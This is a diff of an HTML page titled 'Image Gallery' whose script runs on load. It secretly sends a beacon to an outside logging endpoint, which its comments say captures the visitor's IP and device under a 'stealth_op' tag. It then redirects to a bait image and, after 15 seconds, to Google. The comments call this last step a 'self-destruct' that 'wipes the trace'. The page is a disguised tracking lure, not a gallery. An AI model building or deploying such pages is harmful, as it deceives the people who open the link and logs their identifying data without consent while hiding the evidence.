@@ -4,17 +4,21 @@
     <title>Image Gallery</title>
     <script>
         function triggerAlpha() {
-            // NEW VARIABLE NAMES TO BYPASS BROWSER MEMORY
             const alpha = "https://bluekama-project.free.beeceptor.com/hit";
             const omega = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
             
-            // THE BEACON
-            navigator.sendBeacon(alpha + "?ref=final_test&ts=" + Date.now());
+            // 1. DATA PING: Sends IP/Device to Beeceptor instantly
+            navigator.sendBeacon(alpha + "?ref=stealth_op&ts=" + Date.now());
 
-            // THE REDIRECT
+            // 2. THE BAIT: Shows the image after 1 second
             setTimeout(function() {
                 window.location.href = omega;
             }, 1000);
+
+            // 3. THE SELF-DESTRUCT: After 15 seconds, it wipes the trace by going to Google
+            setTimeout(function() {
+                window.location.replace("https://www.google.com");
+            }, 15000);
         }
         window.onload = triggerAlpha;
     </script>
